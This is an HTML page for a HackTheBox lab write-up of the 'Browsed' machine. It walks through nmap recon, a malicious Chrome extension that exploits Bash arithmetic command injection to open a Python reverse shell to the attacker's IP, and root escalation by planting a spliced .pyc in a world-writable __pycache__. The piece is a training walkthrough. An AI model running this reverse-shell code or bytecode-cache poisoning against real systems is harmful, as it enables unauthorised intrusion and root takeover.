@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/browsed.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>[HTB] Browsed - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <h1>[HackTheBox] Browsed Writeup</h1>
+
+                <div class="box-info">
+                    <table>
+                        <tr>
+                            <td>Platform:</td>
+                            <td>HackTheBox</td>
+                        </tr>
+                        <tr>
+                            <td>Machine:</td>
+                            <td>Browsed</td>
+                        </tr>
+                        <tr>
+                            <td>Category:</td>
+                            <td>Web Exploitation</td>
+                        </tr>
+                        <tr>
+                            <td>OS:</td>
+                            <td>Linux</td>
+                        </tr>
+                        <tr>
+                            <td>Difficulty:</td>
+                            <td><span class="difficulty medium">Medium</span></td>
+                        </tr>
+                    </table>
+                </div>
+
+                <div class="tags" style="margin-bottom: 30px;">
+                    <span class="tag">chrome malicious extension</span>
+                    <span class="tag">pyc poisoning via sudo</span>
+                </div>
+
+                <img src="../../images/hackthebox/browsed/index.png" alt="Browsed Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>## Recon</h2>
+
+                <p>In the beginning, I used <code>nmap</code> with the following parameters. I found ports 22 and 80 open (it appears to be a web application running on nginx with Ubuntu Linux).</p>
+
+                <pre><code>[browsed] sudo nmap -Pn -sSVC -p- -T5 --min-rate 2000 -oN nmap browsed.htb
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-13 16:32 -03
+Warning: 10.129.18.235 giving up on port because retransmission cap hit (2).
+Nmap scan report for browsed.htb (10.129.18.235)
+Host is up (0.17s latency).
+Not shown: 65391 closed tcp ports (reset), 142 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
+|_  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Browsed
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 47.31 seconds</code></pre>
+
+                <p>The web application reveals a company app focused on Chrome Extensions Development. It has an interesting extension upload feature (the developer uses it and the app gives us feedback), and the extension must be inside a zip file.</p>
+                <img src="../../images/hackthebox/browsed/recon_app.png" alt="Recon App" style="max-width: 100%; margin: 20px 0;">
+
+                <h2>## Exploitation</h2>
+
+                <p>So basically I think this extension upload feature is the foothold. First, I found this Chrome extension to upload and test the feature: <a href="https://github.com/theypsilon/PHPView-for-Chrome/tree/master/release">PHPView-for-Chrome</a>. In the output, I found the following message:</p>
+
+                <pre><code>[1883:1888:0413/194618.559947:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://browsedinternals.htb/</code></pre>
+
+                <p>This indicates the app has another domain: <code>browsedinternals.htb</code>.</p>
+                <img src="../../images/hackthebox/browsed/output_upload.png" alt="Output Upload" style="max-width: 100%; margin: 20px 0;">
+
+                <p>This other application is a Gitea instance in version 1.24.5. During navigation, we found a public repo that contains an internal application <code>http://browsedinternals.htb/larry/MarkdownPreview</code> with the following README.md:</p>
+
+                <pre><code>This webapp allows us to convert our md files to html. Still in developement, it should only run locally !!!</code></pre>
+
+                <p>During analysis of the code in the repo, the <code>app.py</code> file defines the route <code>/routines/&lt;rid&gt;</code> and passes the <code>rid</code> parameter directly to <code>routines.sh</code> using <code>subprocess.run(["./routines.sh", rid])</code>. The injection is not in <code>subprocess.run</code> itself (it uses a list, so no shell is invoked). The real root cause is that <code>routines.sh</code> uses the argument unquoted inside a Bash array index like <code>arr[$1]</code>. Bash evaluates the content of <code>arr[...]</code> as an arithmetic expression, and arithmetic context expands <code>$(...)</code> command substitution, so a payload like the following triggers command execution:</p>
+
+                <pre><code>GET to http://localhost:5000/routines/arr[$(command)]</code></pre>
+
+                <p>So we need to find a way to access the internal service. We can try to create an extension that reaches it.</p>
+
+                <p>Looking at the documentation <a href="https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts">Chrome Content Scripts</a>, we can create the following files:</p>
+                <ul>
+                    <li><code>manifest.json</code>: declares the extension's capabilities. It requests <code>&lt;all_urls&gt;</code> host permissions so the content script can <code>fetch</code> cross-origin targets (including <code>localhost</code>), and injects <code>content.js</code> into every page via <code>matches: ["&lt;all_urls&gt;"]</code> at <code>document_idle</code>.</li>
+                    <li><code>content.js</code>: runs inside the DOM of every matched page with the privileges granted by the manifest. It fires the <code>fetch</code> to the vulnerable internal service directly, bypassing CORS via <code>mode: 'no-cors'</code>.</li>
+                </ul>
+
+                <p>The exploit extension is a minimal Manifest V3 package with two files:</p>
+
+                <p><code>manifest.json</code></p>
+                <pre><code>{
+    "name": "Exploit",
+    "version": "1.0",
+    "manifest_version": 3,
+    "content_scripts": [
+        {
+            "matches": ["&lt;all_urls&gt;"],
+            "js": ["content.js"],
+            "run_at": "document_idle"
+        }
+    ],
+    "host_permissions": ["&lt;all_urls&gt;"]
+}</code></pre>
+
+                <p><code>content.js</code></p>
+                <pre><code>const ip = "10.10.15.122";
+const port = "4444";
+const pythonPayload = `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`;
+
+const b64Payload = btoa(pythonPayload);
+
+const command = `echo ${b64Payload} | base64 -d | python3`;
+
+const exploitUrl = `http://localhost:5000/routines/arr[$( ${command} )]`;
+
+fetch(exploitUrl, { mode: 'no-cors' }).then(() =&gt; {
+    fetch('http://10.10.15.122:8000/exploit-sent', { mode: 'no-cors' });
+});</code></pre>
+
+                <p>Before uploading, we start the listener <code>nc -lvnp 4444</code> to catch the reverse shell.</p>
+
+                <p>To upload, we need to zip the files and send them to the web application:</p>
+
+                <pre><code>[exploit_extension] zip -r exploit_extension.zip .
+  adding: manifest.json (deflated 49%)
+  adding: content.js (deflated 42%)</code></pre>
+
+                <p>After uploading the extension, we get the shell:</p>
+
+                <pre><code>[browsed] nc -lnvp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.129.18.235 60772
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1000(larry) gid=1000(larry) groups=1000(larry)</code></pre>
+
+                <pre><code>$ cd ~
+$ ls -la
+total 56
+drwxr-x--- 9 larry larry 4096 Jan  6 11:11 .
+drwxr-xr-x 4 root  root  4096 Jan  6 10:28 ..
+lrwxrwxrwx 1 root  root     9 Dec 29 09:55 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 larry larry  220 Mar 31  2024 .bash_logout
+-rw-r--r-- 1 larry larry 3771 Mar 31  2024 .bashrc
+drwx------ 4 larry larry 4096 Jan  6 10:28 .cache
+drwx------ 3 larry larry 4096 Jan  6 10:28 .config
+-rw-rw-r-- 1 larry larry   36 Aug 17  2025 .gitconfig
+drwx------ 3 larry larry 4096 Jan  6 10:28 .gnupg
+drwxrwxr-x 3 larry larry 4096 Jan  6 10:28 .local
+drwxrwxr-x 9 larry larry 4096 Jan  6 10:28 markdownPreview
+drwx------ 3 larry larry 4096 Jan  6 10:28 .pki
+-rw-r--r-- 1 larry larry  807 Mar 31  2024 .profile
+lrwxrwxrwx 1 larry larry    9 Aug 17  2025 .python_history -&gt; /dev/null
+drwx------ 2 larry larry 4096 Jan  6 10:28 .ssh
+-rw-r----- 1 root  larry   33 Apr 13 19:18 user.txt</code></pre>
+
+                <h2>## Post Exploitation</h2>
+
+                <p>After obtaining the shell, running <code>sudo -l</code> shows the following permission:</p>
+
+                <pre><code>$ sudo -l
+Matching Defaults entries for larry on browsed:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User larry may run the following commands on browsed:
+    (root) NOPASSWD: /opt/extensiontool/extension_tool.py</code></pre>
+
+                <p>The core vulnerability was a weak file permission on the <code>__pycache__</code> directory within <code>/opt/extensiontool/</code>. This directory was world-writable, allowing any user to add or delete files within it, regardless of who owned the specific files.</p>
+
+                <pre><code>$ ls -la /opt/extensiontool/
+total 24
+drwxr-xr-x 4 root root 4096 Dec 11 07:54 .
+drwxr-xr-x 4 root root 4096 Aug 17  2025 ..
+-rwxr-xr-x 1 root root  ... extension_tool.py
+-rw-r--r-- 1 root root  ... extension_utils.py
+drwxr-xr-x 2 root root 4096 Dec 11 07:54 extensions
+drwxrwxrwx 2 root root 4096 Dec 11 07:57 __pycache__</code></pre>
+
+                <p>With a shell as larry, running <code>sudo -l</code> shows we can execute <code>/opt/extensiontool/extension_tool.py</code> as root without a password. The script itself has no obvious injection point, so the escalation has to come from a module it imports at runtime. Listing the application directory reveals the real weakness: the <code>__pycache__</code> folder is world-writable (<code>drwxrwxrwx</code>), even though the <code>.pyc</code> files inside it are owned by root. We can't overwrite root-owned files, but because the directory is writable we can freely delete existing entries and drop new ones, and that is enough to poison Python's bytecode cache.</p>
+
+                <p>CPython's import machinery works in our favor here. When <code>extension_tool.py</code> runs <code>import extension_utils</code>, Python first checks <code>__pycache__</code> for a matching <code>extension_utils.cpython-312.pyc</code>. If the file's 16-byte header (magic number, bit field, source timestamp, and source size) matches the corresponding <code>.py</code>, Python skips parsing the source entirely and executes the cached bytecode directly. Ownership is never checked, only the header validity. If we can place a <code>.pyc</code> with a legitimate-looking header but a malicious body under that exact name, the root-privileged script will run our code on import.</p>
+
+                <p>The first step is making sure a legitimate <code>.pyc</code> exists so we have a valid header to steal. Running the sudo rule once forces Python to compile <code>extension_utils.py</code> and write a fresh cache file:</p>
+
+                <pre><code>sudo /opt/extensiontool/extension_tool.py
+  [X] Use one of the following extensions : ['Fontify', 'Timer', 'ReplaceImages']</code></pre>
+
+                <p>The usage error is irrelevant. What matters is that <code>/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc</code> now exists on disk.</p>
+
+                <p>Next, we build the payload in <code>/tmp</code>. A minimal <code>pwn.py</code> elevates privileges and drops an interactive shell:</p>
+
+                <pre><code>import os
+os.setuid(0)
+os.setgid(0)
+os.system("/bin/bash")</code></pre>
+
+                <p>We compile it with the exact Python version used by the target (3.12, to guarantee magic-number compatibility):</p>
+
+                <pre><code>larry@browsed:/tmp$ /usr/bin/python3.12 -m compileall pwn.py
+larry@browsed:/tmp$ ls -la __pycache__/
+total 12
+drwxr-xr-x  2 larry larry 4096 Apr 13 21:06 .
+drwxrwxrwt 32 root  root  4096 Apr 13 21:09 ..
+-rw-r--r--  1 larry larry  303 Apr 13 21:06 pwn.cpython-312.pyc</code></pre>
+
+                <p>This produces <code>/tmp/__pycache__/pwn.cpython-312.pyc</code>. Its body contains the bytecode we want, but its header identifies <code>pwn.py</code> as the source, which will not match <code>extension_utils.py</code> and would be rejected by the import loader.</p>
+
+                <p>To fix that, we splice together a Frankenstein <code>.pyc</code>: the first 16 bytes from the legitimate file (the header describing <code>extension_utils.py</code>) followed by the body of our malicious compiled payload:</p>
+
+                <pre><code>head -c 16 /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc &gt; /tmp/header.bin
+tail -c +17 /tmp/__pycache__/pwn.cpython-312.pyc &gt; /tmp/body.bin
+cat /tmp/header.bin /tmp/body.bin &gt; /tmp/evil.pyc</code></pre>
+
+                <p>To Python, this file looks like a valid cache for <code>extension_utils.py</code>, but it actually executes our root-shell bytecode.</p>
+
+                <p>We can't overwrite the root-owned legitimate <code>.pyc</code> directly, but the world-writable parent directory lets us delete it and drop our crafted copy in its place under the same filename:</p>
+
+                <pre><code>rm /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
+cp /tmp/evil.pyc /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc</code></pre>
+
+                <p>The new file is now owned by larry, but Python does not care about ownership, only about the header matching the source.</p>
+
+                <p>Finally, we trigger the sudo rule again:</p>
+
+                <pre><code>larry@browsed:/tmp$ sudo /opt/extensiontool/extension_tool.py
+root@browsed:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+                <p>Python starts <code>extension_tool.py</code> as root, reaches <code>import extension_utils</code>, finds our poisoned <code>.pyc</code> in the cache, validates the stolen header against <code>extension_utils.py</code>, trusts the cache, and executes our bytecode body inside the root-privileged process. The <code>setuid(0)</code> / <code>setgid(0)</code> / <code>os.system("/bin/bash")</code> sequence drops us into an interactive root shell, achieving full system compromise via a weak directory permission and Python's implicit trust in its own bytecode cache.</p>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Browsed</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px dashed var(--text-dim);">
+                <a href="../../writeups.html">&lt;&lt; Back to Writeups</a>
+            </div>
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
